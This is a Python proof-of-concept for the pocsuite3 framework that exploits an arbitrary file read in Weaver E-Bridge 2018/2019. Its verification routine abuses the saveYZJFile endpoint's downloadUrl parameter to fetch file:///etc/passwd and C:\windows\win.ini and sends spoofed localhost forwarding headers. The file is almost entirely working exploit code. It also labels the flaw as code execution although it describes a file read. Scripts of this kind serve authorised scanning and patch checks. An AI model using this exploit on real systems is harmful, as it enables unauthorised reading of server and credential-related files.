from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import random,time,base64,re

class TestPOC(POCBase):
    vulID = '12341'  # ssvid
    version = '1.0'
    name = '泛微云桥 E-Bridge 2018 2019 任意文件读取'
    appName = '泛微云桥 E-Bridge 2018 2019 任意文件读取'
    appVersion = 'E-Bridge 2018 2019'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''泛微云桥 E-Bridge 2018 2019 任意文件读取'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):              #验证模式
        result = {}
        path = "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C://windows/win.ini&fileExt=txt"
        vulurl1 = self.url+path
        vulurl2=self.url+"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
        headers={"X-Forwarded-For": "127.0.0.1",
                 "X-Originating" : "127.0.0.1",
                 "X-Remote-IP": "127.0.0.1",
                 "X-Remote-Addr": "127.0.0.1",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
                 }
        try:
            resp1 = requests.post(url=vulurl1,verify = False, allow_redirects = False, timeout=4,headers=headers)
            resp2= requests.get(url=vulurl2,verify = False, allow_redirects = False, timeout=4,headers=headers)
            if "isencrypt" in resp1.text and "createtime" in resp1.text and "filepath" in resp1.text and resp1.status_code==200 or "isencrypt" in resp2.text and "createtime" in resp2.text and resp2.status_code==200 and "filepath" in resp2.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vulurl1
            return self.parse_output(result)
        except:
            pass
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
